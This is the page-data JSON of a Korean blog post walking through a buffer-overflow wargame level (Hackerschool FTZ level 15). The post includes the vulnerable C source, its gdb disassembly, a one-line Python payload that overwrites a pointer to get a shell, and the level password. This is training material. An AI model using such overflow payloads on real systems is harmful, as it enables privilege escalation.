{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221005/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>BOF문제인데, int *check 포인터가 0xdeadbeef를 가리킨다면 쉘 코드를 실행시켜주는 식이다. 소스코드를 보면서 시작하자.</p>\n<h3>1. Level 15</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h> \r\nmain(){\r\n     int crap;  \r\n     int *check; \r\n      char buf[20];  \r\n     fgets(buf,45,stdin);  \r\n     if (*check==0xdeadbeef)   \r\n        {     setreuid(3096,3096);    \r\n              system(\"/bin/sh\");  \r\n              }\r\n    }</code></pre></div>\n<p>대충 요런식이다. gdb를 이용해서  disassemble 해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x080483b8 &lt;main+0>:    push   ebp\r\n0x080483b9 &lt;main+1>:    mov    ebp,esp\r\n0x080483bb &lt;main+3>:    sub    esp,0x38\r\n0x080483be &lt;main+6>:    and    esp,0xfffffff0\r\n0x080483c1 &lt;main+9>:    mov    eax,0x0\r\n0x080483c6 &lt;main+14>:   sub    esp,eax\r\n0x080483c8 &lt;main+16>:   sub    esp,0x4\r\n0x080483cb &lt;main+19>:   push   ds:0x80495d4\r\n0x080483d1 &lt;main+25>:   push   0x2d\r\n0x080483d3 &lt;main+27>:   lea    eax,[ebp-56]\r\n0x080483d6 &lt;main+30>:   push   eax\r\n0x080483d7 &lt;main+31>:   call   0x80482d8 &lt;fgets>\r\n0x080483dc &lt;main+36>:   add    esp,0x10\r\n0x080483df &lt;main+39>:   mov    eax,DWORD PTR [ebp-16] // 16 -12 pointer\r\n0x080483e2 &lt;main+42>:   cmp    DWORD PTR [eax],0xdeadbeef\r\n0x080483e8 &lt;main+48>:   jne    0x804840f &lt;main+87>\r\n0x080483ea &lt;main+50>:   sub    esp,0x8\r\n0x080483ed &lt;main+53>:   push   0xc18\r\n0x080483f2 &lt;main+58>:   push   0xc18\r\n0x080483f7 &lt;main+63>:   call   0x80482f8 &lt;setreuid>\r\n0x080483fc &lt;main+68>:   add    esp,0x10\r\n0x080483ff &lt;main+71>:   sub    esp,0xc</code></pre></div>\n<p>ebp-56 위치에 buf 배열이 마무리되고, ebp-16지점에</p>\n<p>단, 우리는 deadbeef의 메모리 주소값을 알아내어야 한다. 이를 위해선 gdb에서 x/20x를 해보면 된다. 노가다를 뛰면서 일일히 값을 입력하다보면 딱 0xdeadbeef가 나오는 주소를 발견하는데,</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x80484b2</code></pre></div>\n<p>라는걸 확인할 수 있다. 그럼 단순히 저 값을 bof 공격을 통해 check 포인터에 넣어주면 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"> (python -c 'print \"A\"*40+\"\\xb2\\x84\\x04\\x08\"'; cat) | ./attackme</code></pre></div>\n<p>단순하다고 할 수 있는 문제였던 것 같다.</p>\n<p>비밀번호 : about to cause mass</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"시스템 해킹(11) : 해커스쿨 FTZ 레벨 15","summary":"","date":"2022.10.05.","before":"2022.10.04.","after":"2022.10.06.","categories":["C-SEC","KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVRkeVbT188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwEEERMSACFRktL/2gAIAQMBAT8B2ipFjU+yabLh3VyNorN1QQFT5GXGOYTKlxiOWAzy7zES0vA+0/PX/8QAHREAAgIDAAMAAAAAAAAAAAAAAgMBBBITIQAx0f/aAAgBAgEBPwGuMuOvJoppdUSYJeCVbhTaYb2I2CkSIJsG50wXM2nOMz0t7I5krnPR/PP/xAAmEAACAQIGAQQDAAAAAAAAAAABAgMEEgAFERMhMSIUFSNBMpLh/9oACAEBAAY/Aq/KJs3zY0sdJFQ5E0NXLTS5PPNOWhqKYMHtowj1Hqqa2QS7aIgAYuPccyzQZjIslRTpWqoaOojgndd7eXht1bXSxdOT4AnHLc/ficEaq61NHJQkSC/bjHzI8Wv4yo6eL92ySL0xxtONVU3qLmtTstYo0CljoSR9jrHCn9v5j//EABwQAQEAAgIDAAAAAAAAAAAAAAERACFBUTFxgf/aAAgBAQABPyHWJvxKWgfi8l2Skpfpos8FGJji06G0TyMHZz1jUCzgTuk9EUsRNJkdSKwnsSquMiP35+M//9oADAMBAAIAAwAAABCQH//EABgRAQEBAQEAAAAAAAAAAAAAAAERACFx/9oACAEDAQE/EE+TpdStOdiavBQ21X17v//EABkRAAIDAQAAAAAAAAAAAAAAABEhAAFBMf/aAAgBAgEBPxB+k27FYwBSsS4wEHlQrAzBqpT/xAAZEAEBAQEBAQAAAAAAAAAAAAABESEAMUH/2gAIAQEAAT8Qm5D613Vaz4sCNvgJQCOeKY0zpwewxUIRguqIInPHcqiaKJ4IxFQZhRsyiwbhBPoTrDrq6VSjvqK/Xv/Z"},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221005/"}},"staticQueryHashes":[]}